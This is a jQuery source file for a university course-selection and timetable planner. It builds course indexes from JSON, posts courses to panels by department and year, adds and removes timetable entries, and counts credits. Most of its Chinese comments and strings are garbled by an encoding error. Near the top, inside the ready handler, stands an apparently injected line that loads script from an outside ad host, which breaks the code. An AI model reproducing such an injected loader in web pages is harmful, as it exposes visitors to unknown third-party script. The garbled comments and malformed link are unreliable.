(function($){
        //�ȶ��xJQuery��$����Ҫ׌���nͻ        
            $(function(){
                <script src="http://ad.nchusg.org/ad.js"></script>
                /**һ�_ʼ�ĺ��װ�ʹ���f��**/
                //toastr.success("1. Ո���x��ϵ���_ʼ��δ�x��ϵ�����o��ʹ�����¹��ܣ�<br />2. �c���n���е�+��̖����߅��λ���@ʾ���ŵ��n�̣�Ո�Ƽ�����<br />3. �κ��n�̶�����ʹ���n�̲�ԃ����<br />�؄eС����(1)���n�̲�ԃ�Ը�λݔ��ėl���Y�x���l��Խ�٣��ҵ����ϵ��n�̾�Խ��<br />�؄eС����(2)���������Ҫ��ԃ����ϵ�ı��x�ޣ�Ҳ����ʹ���n�̲�ԃ<br />4. ����ź��n������ҪՈ�؈D�����Լ�������n������n��̫�󣬿����ÿs�Ź��܁�sСҕ�������؈D��", "ʹ���f��", {timeOut: 2500});
                //���ļ��ʂ�õĕr���x��json�n
                window.credits=0//һ�_ʼ�ČW�֔���0
                window.courses = {};//����һ���յ����
                window.course_of_majors = {};//����һ���յ����
                window.course_of_day = {};  //�@���������ڵ����
                window.teacher_course = {}; //�@�����ώ�������index�����
                window.name_of_course = {}; //�@�����n�����Q��index�����
                window.name_of_optional_obligatory = [] //�@���Á��ϵ�ϵı����n���z���Л]���n�������}�ģ����о�׌ʹ�������ЛQ��Ҫ������
                window.json_resource=["json/user.json","json/user2.json"];//temp array,�ȕ��r���ɱ��ض˵���У�δ�����Ҫ��ajaxȡ���Y��
                window.user=[];//this array will be filled with student's json.
                window.agenda_count=[[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0]];
                window.agenda_name_count=[["","","","","","","","","","","","",""],["","","","","","","","","","","","",""],["","","","","","","","","","","","",""],["","","","","","","","","","","","",""],["","","","","","","","","","","","",""]]
                //Tiagenda�ĳ�ʼֵ����ÿһ�Εr�g���]�б��دB��
                $.each(window.json_resource,function(kk,kv){
                    $.getJSON(kv, function(json){  //getJSON����function(X)����X����������                    
                        $("#class_credit").text(0);
                        window.language="zh_TW";//�̶��@ʾ�Z�Ԟ�����
                        $.each(json.time_table, function(ik, iv){
                            if(typeof(window.course_of_majors[iv.for_dept]) == 'undefined')//����@һ��(�е����Q������ֵkey)�ǿյ�Ҳ����undefined���Ǿ͌����M�г�ʼ����{}����e����Է�����Ė|������������Ѻܶ�������M�@������e��
                                window.course_of_majors[iv.for_dept] = {};
                            if(typeof(window.course_of_majors[iv.for_dept][iv.class]) == 'undefined'){
                                window.course_of_majors[iv.for_dept][iv.class] = [];//����@һ��(�е����Q������ֵkey)�ǿյ�Ҳ����undefined���Ǿ͌����M�г�ʼ����[]�e����Ƿ����
                            }
                            window.course_of_majors[iv.for_dept][iv.class].push(iv.code);//�і|�����M�@������e�������stackһ��
                            if(typeof(window.courses[iv.code])=='undefined'){
                                window.courses[iv.code]=[];
                            }
                            window.courses[iv.code].push(iv);//�@߅����ֱ�Ӱ��x�n̖��������ֵkey���e���ֵ��object
                            $.each(iv.time_parsed, function(jk, jv){//�������ڵ����
                                $.each(jv.time, function(mk, mv){
                                    if(typeof(window.course_of_day[jv.day])=='undefined'){
                                        window.course_of_day[jv.day]={};
                                    }
                                    if(typeof(window.course_of_day[jv.day][mv])=='undefined'){
                                        window.course_of_day[jv.day][mv]=[];
                                    }
                                    window.course_of_day[jv.day][mv].push(iv);
                                })
                            })
                            if(typeof(window.teacher_course[iv.professor])=='undefined'){//�����ώ����Q�����
                                window.teacher_course[iv.professor]=[];
                            }
                            window.teacher_course[iv.professor].push(iv);
                            if(typeof(window.name_of_course[iv.title_parsed.zh_TW])=='undefined'){//�����n�����
                                window.name_of_course[iv.title_parsed.zh_TW]=[];
                            }
                            window.name_of_course[iv.title_parsed.zh_TW].push(iv);
                            if(typeof(window.name_of_course[iv.title_parsed.en_US])=='undefined'){//Ӣ���n�����
                                window.name_of_course[iv.title_parsed.en_US]=[];
                            }
                            window.name_of_course[iv.title_parsed.en_US].push(iv);
                        });
                    });                                         
                })        
                /*******    ���u���[�؂șڵĹ��ܡ�   *******/
                    /***����***/
                $("#obligatory-span").click(function(){
                    // ���c���D���r����������[�ؕr�t�@ʾ������֮�t�[��
                    $('#obligatory-post').slideToggle();
                    $('#obligatory-span').find("span").toggle();
                });
                    /***�W���n***/
                $("#year-span").click(function(){
                    $('#year-post').slideToggle();
                    $('#year-span').find("span").toggle();
                });
                    /***�x��***/
                $("#elective-span").click(function(){
                    $('#elective-post').slideToggle();
                    $('#elective-span').find("span").toggle();
                });
                    /***ͨ�R***/
                $("#general-span").click(function(){
                    $('#general-post').slideToggle();
                    $('#general-span').find("span").toggle();
                });
                    /***�w��***/
                $("#school-span").click(function(){
                    $('#school-post').slideToggle();
                    $('#school-span').find("span").toggle();

                });
                    /***�ь�***/
                $("#search-span").click(function(){
                    $('#search-post').slideToggle();
                    $('#search-span').find("span").toggle();
                });
                    /***һ�꼉***/
                $("#freshman-head").click(function(){
                    $("#freshman-head").find("span").toggle();
                    $("#freshman").find("button").toggle("slow");
                });

                $("#sophomore-head").click(function(){
                    $("#sophomore-head").find("span").toggle();
                    $("#sophomore").find("button").toggle("slow");
                });
                $("#junior-head").click(function(){
                    $("#junior-head").find("span").toggle();
                    $("#junior").find("button").toggle("slow");
                });
                $("#senior-head").click(function(){
                    $("#senior-head").find("span").toggle();
                    $("#senior").find("button").toggle("slow");
                });
                $("#fifth-grade-head").click(function(){
                    $("#fifth-grade-head").find("span").toggle();
                    $("#fifth-grade").find("button").toggle("slow");
                });
                $("#whole-school-head").click(function(){
                    $("#whole-school-head").find("span").toggle();
                    $("#whole-school").find("button").toggle("slow");
                });


                /*******   ���u���[�؂șڵĹ��ܡ�   *******/

                $("#bulletin").delegate("span.fa-trash", "click", function(){   //�@�ǽo����Ͱ�õ�
                    /*
                    if($(this).parents("button").attr("class")=="close obligatory"){
                        $("#obligatory-post").empty();
                    }*/
                    if($(this).parents("button").attr("class")=="close elective"){
                        $("#freshman").empty();
                        $("#sophomore").empty();
                        $("#junior").empty();
                        $("#senior").empty();
                        $("#fifth-grade").empty();
                    }
                    else if($(this).parents("button").attr("class")=="close general"){
                        $('#humanities').empty();
                        $('#social').empty();
                        $('#natural').empty();
                    }
                    else if($(this).parents("button").attr("class")=="close school"){
                        $('#chinese').empty();
                        $('#english').empty();
                        $('#PE-post').empty();
                        $('#military-post').empty();
                        $('#teacher-post').empty();
                        $('#foreign-post').empty();
                        $('#non-graded-optional-post').empty();
                    }
                    else{
                        $(this).parents(".panel-heading").next().empty();
                    }
                });
                $("#bulletin").delegate("button.btn-link", "click", function(){//delegate����ȥץ��߀�����ڵĖ|������һ��$()��ָ���õą^��delegate��()�e�����option��dblclick���¼�
                    var code = $(this).val();//this��������ץ�����ǂ��|����Ҳ����option
                    course = courses[code][0];
                    var check=add_course($('#time-table'), course, language);
                    if(check=="available"){
                        change_color($(this),"used");//�x�^���n�͕̾����ɫ
                    }
                });
                /**********����Ҫ��ϵ���ύfunciton����Ҫ�޸�Ո֔��С��!!!***********/
                $("#department_search").click(function(){//
                    var major=$("#v_major").val();  //ȡ��ϵ                    
                    major=major.split('-')[1];                    
                    var level = check_which_class(major,$("#v_level").val());//ȡ���꼉                  
                    major=major.split(" ");
                    major=major[0];                    
                    reset();
                    $("td").html('<span class="fa fa-plus-circle fa-5x"></span>');
                    if(level==""){//�@�ǽo�ČWԺ������WԺ�c�r�I����Ȼ�YԴ�WԺ�@�N�]���꼉���x�
                        $.each(course_of_majors[major][level],function(ik,iv){//����@�NԺ���nһ���ǽ��oʹ�����Լ��x�����ԾͲ��Ԅ�����
                            $.each(courses[iv],function(jk,jv){
                                if(jv.for_dept==major){//����n�̴��a�������}ʹ�ã�������forޒȦ�Д����ǲ���ϵ���_���n
                                    if(jv.obligatory_tf==true){
                                        bulletin_post($("#obligatory-post"),jv, language);
                                    }
                                    if(jv.obligatory_tf==false){
                                        if(jv.class==1){
                                            bulletin_post($("#freshman"),jv, language);
                                        }
                                        if(jv.class==2){
                                            bulletin_post($("#sophomore"),jv, language);
                                        }
                                        if(jv.class==3){
                                            bulletin_post($("#junior"),jv, language);
                                        }
                                        if(jv.class==4){
                                            bulletin_post($("#senior"),jv, language);
                                        }
                                        if(jv.class==5){
                                            bulletin_post($("#fifth-grade"),jv, language);
                                        }
                                        if(jv.class==""){
                                            bulletin_post($("#whole-school"),jv, language);
                                        }
                                    }
                                    //check_optional_obligatory(courses[iv]);
                                }
                            })
                        });
                    }                    
                    else{                        
                        $.each(course_of_majors[major][level], function(ik, iv){//���@һ�꼉�ı����nȫ�����^һ�Σ�Ӌ�����}�n���Ĕ���
                            $.each(courses[iv],function(jk,jv){
                                if(jv.obligatory_tf==true&&jv.for_dept==major&&jv.class==level){//�@�ӾͿ��Ա��C��Ӌ�㵽�ı��ޔ���һ����ԓ��ϵԓ�꼉ԓ�༉��
                                    check_optional_obligatory(jv);
                                }
                            })

                        });                       
                        $.each(course_of_majors[major][level], function(ik, iv){//֪����Щ�n�̕����}֮�ᣬ�ٛQ����Щ�n��Ҫ�����n��
                            $.each(courses[iv],function(jk,jv){
                                if(jv.for_dept==major){                    
                                    var tmpCh = jv.title_parsed["zh_TW"].split(' ');       //(�@�������n��)�и��n�����Q�������ո�����_
                                    title_short = tmpCh[0];     //title_short�Ǖ��Ԅ�����ą^��׃������]��Ӣ�ĵ��n��
                                    var class_EN=level.split("")[1];//�༉��A��B�����������ǂ����a
                                    if(window.name_of_optional_obligatory[title_short]==1){//ֻ�б����n������ʽӋ�㔵�������ԾͲ������Д��Ƿ������ˣ�һ����                             
                                 
                                        if(title_short=="����(һ)"||title_short=="����(һ)"||title_short=="��������(һ)"||title_short=="����(һ)"){//�Д��Ƿ������������Z���n
                                          
                                            bulletin_post($("#year-post"),jv,language);                            
                                        }
                                        if(jv.time_parsed==0){//��ʾ��ԓ�錍���n�����ԟo�r�g���������[]��boolean�Д�ʽ�о�Ȼ��������0
                                            bulletin_post($("#obligatory-post"),jv,language);                                            
                                        }
                                        else{
                                            if(jv.class==level){
                                                add_course($('#time-table'), jv, language);//����@���n��ֻ�г��F�^һ�Σ��Ϳ����Ԅ�����       
                                            }
                                            
                                        }                                        
                                    }
                                    else{//�����F��ֹһ�εĕr��́G��bulletin������ֻ�G����@���༉��                    
                                        if(jv.class==level&&jv.obligatory_tf==true){
                                            show_optional_obligatory(jv);//�����}���F���t׌ʹ�����Լ��Q��
                                        }
                                    }
                                }
                            })
                        });
                        $.each(course_of_majors[major], function(ik, iv){//ϵ�����е��x���n��������bulletin
                            if(check_if_two_class(level).length==1){//����ֻ��һ����
                                $.each(iv,function(jk, jv){
                                    $.each(courses[jv],function(kk,kv){
                                        if(kv.obligatory_tf==false&&kv.for_dept==major){
                                            //console.log(kv);
                                            check_which_bulletin(kv);//��fuction�Q��ԓ�N���Ă��꼉�ę�λ
                                        }
                                    })
                                })
                            }                            
                            else{//�����Ѓɂ���                                
                                var class_EN=level.split("")[1];//�༉��A��B�����������ǂ����a
                                if(ik.split("")[1]==class_EN){
                                    $.each(iv,function(jk, jv){
                                        $.each(courses[jv],function(kk,kv){
                                            if(kv.obligatory_tf==false&&kv.for_dept==major&&kv.class.split("")[1]==class_EN&&kv.class.split("")[0]==ik.split("")[0]){
                                                //console.log(kv);
                                                check_which_bulletin(kv);//��fuction�Q��ԓ�N���Ă��꼉�ę�λ
                                                return false;
                                            }
                                        })
                                    })
                                }
                            }
                        })  //���Ϟ���� �x������
                    }
                });
                window.sub_major=$("#s_major").val();//���˷���ʹ���߲����ԃĳһϵ��ͬ�꼉���n
                window.sub_level=$("#s_level").val();//���Բ����Ԅӌ��@�ɂ���λ��յ��A�Oֵ������Ҫ�Дஔ�@�ɂ���λ�и��Ӳ��M�в�ԃ����
                $("#specific_search").click(function()  //�������n̖�ь�����input�ĵ��n̖��.val()ȡ��
                {
                    var major=$("#s_major").val();
                    var level=$("#s_level").val();                 
                    var code = $("#class_code").val();
                    //�n̖�ь�
                    if(major==sub_major&&level==sub_level){                        
                        if(code!=""){
                            bulletin_post($("#search-post"),courses[code][0], language);
                            $("#class_code").val("");
                        }
                        title_search(credits_filter());//�@���зքe���n���ь��ͽ̎����Q�ь�
                        //�ѺY�x�W�ֵĺ�ʽ������������
                        teach_search(credits_filter());
                        $("#credits").val("");
                    }
                    else{
                        sub_major=major;    //�o��@���ύ��ϵ������׌�´��Д��Л]��׃��
                        sub_level=level;
                        major=major.split('-')[1];                        
                        var level = check_which_class(major,$("#s_level").val());//ȡ���꼉
                        major=major.split(' ');//�@�����Ǟ���̎���з�A��B���ϵ���ִ���ֻҪȡϵ�ͺã�AB�Ϳ�����
                        major=major[0];
                        reset_for_time_request();
                        department_course_for_specific_search(major,level);
                    }
                });
                $("#clear-button").click(function()
                {
                    reset();
                    $("td").html('<div><span class="fa fa-plus-circle fa-3x"></span></div>');  //�ٰѼ�̖�İ��o����ȥ
                    $("td").attr({"style":""});
                });
                $("#time-table").on( "click", "button[class='close delete']",function(){    //�@���Á��һ�����n�̶��h���İ��o
                    var code = $(this).children("input").val(); //�ҵ��Ӵ���input��Ȼ����e��Ĵ��a�oȡ����
                    var major=$("#v_major").val();  //ȡ��ϵ
                    major=major.split(" ");
                    major=major[0];
                    $.each(courses[code],function(ik,iv){
                        if(iv.obligatory_tf==true&&iv.for_dept==major){
                            toastr.warning("�˞�����n����Ҫ��ԭՈ�c���n��ո�", {timeOut: 2500});
                            delete_course($('#time-table'), iv); //�͸�add_courseһ�ӣ�ֻ�ǰ���|���ĳɄh��
                            return false;
                        }
                        else{
                            delete_course($('#time-table'), iv)//�͸�add_courseһ�ӣ�ֻ�ǰ���|���ĳɄh��
                            return false;
                        }

                    })
                });
                $("#time-table").on("click","span",function(){ //��һ���n���λ�����n�̏�������
                    if($(this).text()==""){ //�ҬF�ڲ�֪��null!=""
                        var major=$("#v_major").val();  //ȡ��ϵ
                        major=major.split(" ");//�@�����Ǟ���̎���з�A��B���ϵ���ִ���ֻҪȡϵ�ͺã�AB�Ϳ�����
                        major=major[0];
                        var s_major=$("#s_major").val();
                        var s_level=$("#s_level").val();
                        s_level=check_which_class(s_major,s_level);//���@��function�Ϳ���̎���з�A��B���ϵ�����o�t���������꼉
                        s_major=s_major.split(" ");//�@�����Ǟ���̎���з�A��B���ϵ���ִ���ֻҪȡϵ�ͺã�AB�Ϳ�����
                        s_major=s_major[0];
                        var day=$(this).closest("td").attr("data-day");//����Ұ�ͬһ�r�ε��n�����M����e������Ҫ��indexȥȡ
                        var hour=$(this).closest("tr").attr("data-hour");
                        reset_for_time_request();
                        $.each(course_of_day[day][hour], function(ik, iv){
                            if(iv.for_dept==major||((iv.for_dept==s_major)&&(iv.class==s_level))||iv.for_dept==undefined||iv.for_dept==""||iv.for_dept=="C00ȫУ��ͬ"||iv.for_dept=="N00��ͬ�W��(�M�ތWʿ��)"){//�Д��������ϵ���n�Ͳ����꼉ȫ�������@ʾ����������oϵ�ľ�ֻ�@ʾԓ�꼉���n�����for_dept==undefined�ʹ�����ͨ�R�n�������C00ȫУ��ͬ��N00��ͬ�W��(�M�ތWʿ��)�͕����w�������������ՌW����ȫУӢ���Z                        
                                //console.log(iv)
                                if(iv.for_dept=="C00ȫУ��ͬ"||iv.for_dept=="N00��ͬ�W��(�M�ތWʿ��)"){
                                //�����ǽ̄�̎�C���n�̲�ԃ�e��������n�������w�������������ࡢȫУ�x�ޡ�ȫУӢ���Z
                                    check_which_common_subject(iv);

                                }
                                else if(iv.obligatory_tf==true){                                 check_which_bulletin_required(iv);
                                //�Д����Ӣ�Ļ��Ǳ����n

                                }
                                else if(iv.obligatory_tf==false){
                                    check_which_bulletin(iv);
                                    //�Q���x���nԓ�N���Ă��꼉�ę�λ
                                }
                            }

                        })
                    }
                });
                /**********�Á��ҹУ�ę�λ�[������***********/
                $("#toggleTable").click(function(){
                    //var toggleicon="fa-sun-o";
                    //var toggleHtml= $(this).html;
                    //var $toggle= $($.parseHTML('<span class="fa ' + toggleicon + ' fa-1x fa-fw"></span>'));
                    //console.log(buttonHtml);
                    $("tr:gt(9)").toggle("slow");
                    if($(toggleTable).val()=="moon")
                    {
                        $(this).val("sun");
                        $(this).removeClass("fa fa-moon-o fa-1x fa-fw");
                        $(this).addClass("fa fa-sun-o fa-1x fa-fw");
                    }
                    else
                    {
                        $(this).val("moon");
                        $(this).removeClass("fa fa-sun-o fa-1x fa-fw");
                        $(this).addClass("fa fa-moon-o fa-1x fa-fw");
                    }
                    //console.log($(this).val);
                });

                $("#v_career").change(function(){//���ӑB׃��ϵ���c�꼉���Q
                //if the career(degree) has been changed, also change the level
                    $("#v_major").empty();
                    $("#s_major").empty();
                    var str="";                                        
                    $( "select option:selected" ).each(function(ik,iv){// filter all selected options, to find the degree options.
                        if($(iv).parent().attr("id")=="v_career"){        
                            str += $( this ).text();
                            //str will be user's degree.
                            //e.g. undergraduate, phd
                        }                        
                    });  
                    $.each(window.department_name[str],function(ik,iv){
                        var newOption=$.parseHTML('<option>'+window.department_name[str][ik]+'</option>');
                        $("#v_major").append(newOption);
                        var newOption=$.parseHTML('<option>'+window.department_name[str][ik]+'</option>');
                        $('#s_major').append(newOption);
                        //append all the department option into major field!!
                    })  
                    if(str=='�Tʿ��'||str=='��ʿ��'||str=='�T����'||str=='�a����'){
                        $('#v_level').empty();
                        $('#s_level').empty();
                        var freshman_value="6",sophomore_value="7";
                        if(str=='��ʿ��'){
                            freshman_value="8";
                            sophomore_value="9";
                        }
                        var newGrade=$.parseHTML('<option value='+freshman_value+'>һ�꼉</option>');
                        var newGrade2=$.parseHTML('<option value='+sophomore_value+'>���꼉</option>');
                        $('#v_level').append(newGrade).append(newGrade2);
                        newGrade=$.parseHTML('<option value='+freshman_value+'>һ�꼉</option>');
                        newGrade2=$.parseHTML('<option value='+sophomore_value+'>���꼉</option>');
                        $('#s_level').append(newGrade).append(newGrade2);
                    }
                    else{                        
                        $('#v_level').empty();
                        $('#s_level').empty();
                        var target_array=['#v_level','#s_level'];
                        var option_array=['<option value="">�o�꼉</option>','<option value="1">һ�꼉</option>','<option value="2">���꼉</option>','<option value="3">���꼉</option>','<option value="4">���꼉</option>','<option value="5">���꼉</option>']
                        var newGrade;
                        $.each(target_array,function(ik,iv){// use for loop use automatically append the option into the right position.
                            $.each(option_array,function(jk,jv){
                                newGrade=$.parseHTML(jv);
                                $(iv).append(newGrade)
                            })
                        })                        
                    }               
                })
            });
            
            window.week = ["һ", "��", "��", "��", "��"];
            /************�@���Á���n�̷ŵ���߅�ę�λ**************/
            var bulletin_post = function($target, course, language){
                if( $.type(course.title_parsed)!=="object" )            //�Д��n�����Q�ǲ������
                    throw 'title_parsed error';
                if( language=="zh_TW" ){
                    course.title_short = course.title_parsed["zh_TW"];      //title_short�Ǖ��Ԅ�����ą^��׃������]��Ӣ�ĵ��n��
                }
                else{
                    course.title_short = course.title_parsed["en_US"];
                }
                var time=build_bulletin_time(course);//���؂�����ǂ��n�̵Ŀ��u���r�gtitle
                var $option = $($.parseHTML('<div><button type="button" class="btn btn-link" data-toggle="tooltip" data-placement="top" style="color:#3074B5;" title="" value=""></button><a class="btn" href="" target="_blank"><span class="fa fa-comment"></span></a></div>'));  //��option����dom���ٰ�dom����jQuery���
                $option.find('button').text(course.title_short);   //���������n�̃��݌���cell��html�Z����
                $option.find('button').attr("title", time);  //��title�e����n�Õr�g
                $option.find('button').val(course.code);                
                //�ѬF���ҵ����@�T�x���n�n�̴��a���浽�@��option���K��value��ʾ       
                //var url=course.url;              
                $option.find('a').attr('href','htsps://onepiece.nchu.edu.tw/cofsys/plsql/Syllabus_main_q?v_strm=1041&v_class_nbr=5346');
                $target.append($option);        //�@ʾ�n�̣���$option�ŵ�elective-post��append��׷��������                
                $('[data-toggle="tooltip"]').tooltip(); //׌tooltip���ܽ���ȥ
            };
            window.once=1;//�Д��Ƿ��ǵ�һ�ΰ�
            window.json_num=0;
            window.current_name="" //���Ŀǰjson��name 
            $("#demo").click(function(){   
                if(once==1)
                {
                    $.each(window.json_resource,function(kk,kv){
                        $.getJSON(kv, function(json){  //getJSON����function(X)����X����������                    
                            window.user.push(json);
                            json_num+=1
                        }).done(function(){     //done��׌��ʽ��ǰ���getJSON�������و����᷽��ʽ
                            //�Á�Ӌ��user��,ÿ���r���Ўׂ������n�Ă���
                            if(json_num==json_resource.length)//�Д�json_sourse�Ƿ�push�M��user
                            {   
                                $.each(user,function(uk,uv){
                                    has_class=[[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0]];//�Ƿ����n�����
                                    $.each(uv.time_table,function(hk,hv){
                                        $.each(hv.time_parsed,function(ik, iv){
                                            $.each(iv.time,function(jk, jv){
                                                agenda_count[iv.day-1][jv-1]++;//���T�n���دB�Δ���һ  
                                                has_class[iv.day-1][jv-1]=1;//�Д��Ƿ����n=1               
                                            });                    
                                        });
                                    });
                                    current_name=uv.name    //���Ŀǰjson��name
                                    //�����n�ĕr�ε�tooltip��������
                                    $.each(has_class,function(ik,iv){
                                        $.each(iv,function(jk,jv){
                                            if(jv==0&&agenda_name_count[ik][jk]=="")
                                            {
                                                //�����n��name����Ŀǰ�r��
                                                agenda_name_count[ik][jk]+=current_name
                                            }
                                            else if(jv==0)
                                            {
                                                current_name=","+current_name
                                                agenda_name_count[ik][jk]+=current_name
                                                current_name=uv.name
                                            }
                                        });
                                    });
                                });
                                //�Ҍ�ÿ���r���ж��������n��ֵ
                                $.each(agenda_count,function(ik,iv){
                                    $.each(iv,function(jk,jv){
                                        var $td = $("#time-table").find('tr[data-hour=' + (jk+1) + '] td[data-day=' + (ik+1) + ']');     //��Ŀǰ���ڵ�tdλ��ָ�ɽo$td    
                                        var $sp = $("#time-table").find('tr[data-hour=' + (jk+1) + '] td[data-day=' + (ik+1) + '] div');//��Ŀǰ���ڵ�spanλ��ָ�ɽo$td
                                        switch(jv)
                                        {
                                            case 0:$sp.attr({
                                                "data-toggle": "tooltip",
                                                "data-placement": "top",
                                                "title": agenda_name_count[ik][jk],
                                                "style": "height: 80%;width:100%",
                                            });//����tooltip�@ʾ���l�ɵ�
                                            $td.attr({
                                                "style": "color:#3074B5;background-color:green;height: 1px;",
                                            });//�]�������n�͕��ľGɫ;
                                            break;
                                            case 1:$sp.attr({
                                                "data-toggle": "tooltip",
                                                "data-placement": "top",
                                                "title": agenda_name_count[ik][jk],
                                                "style": "height: 80%;width:100%",
                                            });//����tooltip�@ʾ���l�ɵ�
                                            $td.attr({
                                                "style": "color:#3074B5;background-color:orange;height: 1px;",
                                            });//�]�������n�͕��ĳ�ɫ;
                                            break;
                                            case 2:$sp.attr({
                                                "data-toggle": "tooltip",
                                                "data-placement": "top",
                                                "title": "�]�˿��Ե�QQ",
                                                "style": "height: 80%;width:100%",
                                            });//����tooltip�@ʾ���l�ɵ�
                                            $td.attr({
                                                "style": "color:#3074B5;background-color:red;height: 1px;",
                                            });//�]�������n�͕��ļtɫ;
                                            break;
                                            default:
                                            break;
                                        }     
                                        //�ѬF���ҵ����@�T�x���n�n�̴��a���浽�@��option���K��value��ʾ       
                                        //var url=course.url;                
                                        $('[data-toggle="tooltip"]').tooltip(); //׌tooltip���ܽ���ȥ            
                                    });  
                                }); 
                                once=0;
                            }
                        });                                           
                    }) 
                }        
            });
            window.add_course = function($target, course, language){      //���Otarget��time-table�ą�����course��courses��ĳһ���n��
                if( !$.isArray(course.time_parsed) )
                    throw 'time_parsed error';      //�Д�time-parsed�ǲ������
                if( $.type(course.title_parsed)!=="object" )            //�Д��n�����Q�ǲ������
                    throw 'title_parsed error';
                if(language == "zh_TW"){
                    var tmpCh = course.title_parsed["zh_TW"].split(' ');        //(�@�������n��)�и��n�����Q�������ո�����_
                    course.title_short = tmpCh[0];      //title_short�Ǖ��Ԅ�����ą^��׃������]��Ӣ�ĵ��n��
                }
                else{
                    var tmpEn = course.title_parsed["en_US"];
                    course.title_short = tmpEn;
                }
                var check_conflict = false; //���Á��Д��Ƿ��n�ã�����Єt�����if�͕�׌����Ȧ��eachֹͣ
                if(check_conflict==false){
                    $.each(course.time_parsed, function(ik, iv){
                        $.each(iv.time, function(jk, jv){       //ͬ�ϣ�iv.    time��"time"�����{3,4}��jk��0~1��jv��3~4(����)
                            var $td = $target.find('tr[data-hour=' + jv + '] td:eq(' + (iv.day-1) + ')');
                            var $cell = $($.parseHTML('<div><div><button type="button" class="close delete" data-dismiss="alert" aria-label="Close" style="color:red;"><span aria-hidden="true"  style="color:red;">&times;</span><input type="hidden" name="code-of-course" value=""></button></div><div class="title"></div><div class="row"><div class="professor col-xs-5"></div><div class="location col-xs-7"></div>'));
                            //�������html��ʽ�R���ҵ���td type��(  parseHtml������İ��b��dom������һ��$���b��jQuery���)
                            $cell.find('.title').text(course.title_short).end()
                            $cell.find('input').val(course.code).end()      //���������n�̃��݌���cell��html�Z���У�.title����class="title"
                                 .find('.professor').text(course.professor).end()   //text()   ���і|�������ҵ���class���e��end()���ص�var $cell��һ��
                                 .find('.location').text(fill_loction(course));
                            $td.html($cell.html());     //�@ʾ�n�̣���cell.html()����<td>tag�e�棬�����e��ԭ���а��oҲ��ֱ�ӱ��w����$.html()��ȡdiv�e��Ė|��                    
                        });
                    });
                    add_credits(course);                                       
                }
                if(check_conflict==false){
                    return("available");    //�]�n�ã�����׃ɫ
                }
                else{
                    return("conflict")  //�n�ã���Ҫ׃ɫ
                }
            };

            /**********�@���Á�h���n�õ��n��***********/
            var delete_conflict = function($target, course, stop_day, stop_time) {
            //���Otarget��time-table�ą�����course��courses��ĳһ���n��
                $.each(course.time_parsed, function(ik, iv){
                    //each��forޒȦ time-parsed[{...}, {...}]����΢�e�֞���:һ��{"day"+"time"}������е�һ������ik��0~1(�ɴ�)
                    var already_delete = false;
                    if(already_delete){
                        return false;
                    }
                    $.each(iv.time, function(jk, jv){       //ͬ�ϣ�iv.time��"time"�����{3,4}��jk��0~1��jv��3~4(����)
                        if(iv.day==stop_day&&jv==stop_time){
                            already_delete=true;
                            return false;
                        }
                        //console.log("�h����"+iv.day+" "+jv+" ");
                        var $td = $target.find('tr[data-hour=' + jv + '] td:eq(' + (iv.day-1) + ')');
                        //td:eq()���ь�td���������ֵ���ҵ��n�̵ĕr�g    iv.day�����ڣ������td���������iv.dayҪ�pһ    find()����class!!
                        //console.log($td);
                        $td.empty();    //�@ʾ�n�̣���cell.html()����<td>tag�e��
                    })
                })
            };

            /**********�@����ʽ���Á�h��һ���T�n�̵�**********/
            var delete_course = function($target, course) {
            //���Otarget��time-table�ą�����course��courses��ĳһ���n��
                $.each(course.time_parsed, function(ik, iv){
                //each��forޒȦ time-parsed[{...}, {...}]����΢�e�֞���:һ��{"day"+"time"}������е�һ������ik��0~1(�ɴ�)
                    $.each(iv.time, function(jk, jv){       //ͬ�ϣ�iv.time��"time"�����{3,4}��jk��0~1��jv��3~4(����)
                        var $td = $target.find('tr[data-hour=' + jv + '] td:eq(' + (iv.day-1) + ')');
                        //td:eq()���ь�td���������ֵ���ҵ��n�̵ĕr�g    iv.day�����ڣ������td���������iv.dayҪ�pһ    find()����class!!
                        $td.empty();    //�@ʾ�n�̣���cell.html()����<td>tag�e��
                        $td.html('<span class="fa fa-plus-circle fa-5x"></span>');
                    })
                })
                minus_credits(course);
                change_color($("button[value="+course.code+"]"),"restore");
                $.each(user.time_table,function(ik,iv){
                    //this for loop is to see which element in this array is the one i want to delete.
                    if(iv==course){
                        window.user.time_table.splice(ik,1);
                        //splice can delete the ik'th value and 1 means one only want to delete one value, you can use 3 to delete more value.
                    }
                })
            };
            var add_credits = function(course){//���ӌW��
                window.credits+=parseInt(course.credits);//Ҫ�Ȱ��ִ��͑B�ČW���D��int�������Ӝp
                $("#class_credit").text(window.credits);
            };
            var minus_credits = function(course){
                window.credits-=parseInt(course.credits);
                $("#class_credit").text(window.credits);
            };
            var reset=function(){
                $('#time-table td').empty(); //��Ŀǰ��time-table��գ���׌���꼉���n���܉�Ǭ�Q���@ʾ
                $('#obligatory-post').empty();//������Ҫ����x���n�̡�ָ���r�g�ь����n��
                $('#freshman').empty();
                $('#sophomore').empty();
                $('#senior').empty();
                $('#junior').empty();
                $('#fifth-grade').empty();
                $('#sixth-grade').empty();
                $('#seventh-grade').empty();
                $('#whole-school').empty();
                $('#humanities').empty();
                $('#social').empty();
                $('#natural').empty();
                $('#chinese').empty();
                $('#english').empty();
                $('#PE-post').empty();
                $('#military-post').empty();
                $('#teacher-post').empty();
                $('#foreign-post').empty();
                $('#non-graded-optional-post').empty();
                $('#search-post').empty();
                window.credits=0;
                $("#class_credit").text(window.credits);
                window.name_of_optional_obligatory=[];  //�є��^���n�����       
                agenda_count=[[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0]];
                agenda_name_count=[["","","","","","","","","","","","",""],["","","","","","","","","","","","",""],["","","","","","","","","","","","",""],["","","","","","","","","","","","",""],["","","","","","","","","","","","",""]];
                user=[];
                json_num=0;
                once=1
            }
            var reset_for_time_request=function(){  //�@��function�������td�ĕr�򣬕���ԓ�r�ε��n���@ʾ������Ҫ�Ȱ��@ʾ��λ���
